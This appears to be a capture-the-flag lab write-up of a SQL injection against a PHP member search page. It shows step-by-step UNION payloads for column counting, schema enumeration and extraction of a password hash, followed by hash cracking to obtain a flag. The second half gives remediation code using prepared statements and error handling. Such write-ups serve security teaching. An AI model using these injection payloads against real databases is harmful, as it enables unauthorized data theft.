# Error-Based SQL Injection Vulnerability

## 🎯 Overview
This vulnerability demonstrates an error-based SQL injection attack where the application exposes database errors and allows extraction of sensitive information through SQL error messages.

## 🔍 Vulnerability Details
- **Endpoint**: `/index.php?page=member`
- **Attack Vector**: SQL Injection via member search
- **Database Version**: 5.5.44-0ubuntu0.12.04.1
- **Database Name**: Member_Sql_Injection
- **Vulnerable Table**: users

## ⚔️ Exploitation Process

### 1. Column Enumeration
```sql
# Determine number of columns using ORDER BY
1 order by 1 -- Success
1 order by 2 -- Success
1 order by 3 -- Error
# Result: Query uses 2 columns
```

### 2. Database Information Gathering
```sql
# Get database version
1 union all select 1,version()
Result: 5.5.44-0ubuntu0.12.04.1

# Get database name
1 union all select 1,database()
Result: Member_Sql_Injection
```

### 3. Table and Column Enumeration
```sql
# Get table names
1 union all select 1,group_concat(table_name) 
from Information_schema.tables 
where table_schema=database()
Result: users

# Get column names
1 union all select 1,group_concat(column_name) 
from Information_schema.columns 
where table_name=0x7573657273
Result: user_id,first_name,last_name,town,country,planet,Commentaire,countersign
```

### 4. Data Extraction
```sql
# Get comments
1 union all select 1,group_concat(Commentaire,0x0a) from users
Result: "Decrypt this password -> then lower all the char. Sh256 on it and it's good !"

# Get encrypted password
1 union all select 1,group_concat(countersign,0x0a) from users
Result: 5ff9d0165b4f92b14994e5c685cdce28
```

### 5. Password Cracking Process
1. MD5 Hash: `5ff9d0165b4f92b14994e5c685cdce28`
2. Decrypted: `FortyTwo`
3. Lowercase: `fortytwo`
4. SHA256: 
```bash
echo -n fortytwo | shasum -a 256
```

### Attack Result
**Flag**: 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5

## 🛡️ Security Issues Identified
1. SQL error messages exposed
2. No input validation
3. No prepared statements
4. Direct database error display
5. Weak password storage

## 🔒 Recommended Security Fixes

### 1. Implement Prepared Statements
```php
# Use PDO with prepared statements
public function searchMember($term) {
    $stmt = $this->db->prepare("
        SELECT first_name, last_name 
        FROM users 
        WHERE first_name LIKE :term
    ");
    $stmt->execute(['term' => "%{$term}%"]);
    return $stmt->fetchAll();
}
```

### 2. Input Validation
```php
function validateInput($input) {
    return preg_replace('/[^a-zA-Z0-9\s]/', '', $input);
}
```

### 3. Error Handling
```php
try {
    $result = $db->query($sql);
} catch (PDOException $e) {
    error_log($e->getMessage());
    return 'An error occurred';
}
```

### 4. Security Measures Checklist
- [ ] Use prepared statements
- [ ] Implement input validation
- [ ] Hide database errors
- [ ] Use secure password storage
- [ ] Implement proper error handling
- [ ] Set up WAF rules
- [ ] Regular security audits

## 📝 Best Practices

### Query Security
1. Always use prepared statements
2. Validate all user input
3. Limit database user privileges
4. Use proper error handling
5. Implement query timeouts

### Error Handling Configuration
```php
// Production error handling
ini_set('display_errors', 0);
ini_set('log_errors', 1);
error_reporting(E_ALL);
ini_set('error_log', '/var/log/php-errors.log');
```

## 📚 Additional Resources
- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [PHP PDO Documentation](https://www.php.net/manual/en/book.pdo.php)
- [SQL Injection Attack Prevention Guide](https://www.acunetix.com/websitesecurity/sql-injection/)

## ⚠️ Disclaimer
This documentation is for educational purposes only. Always obtain proper authorization before testing security measures on any system.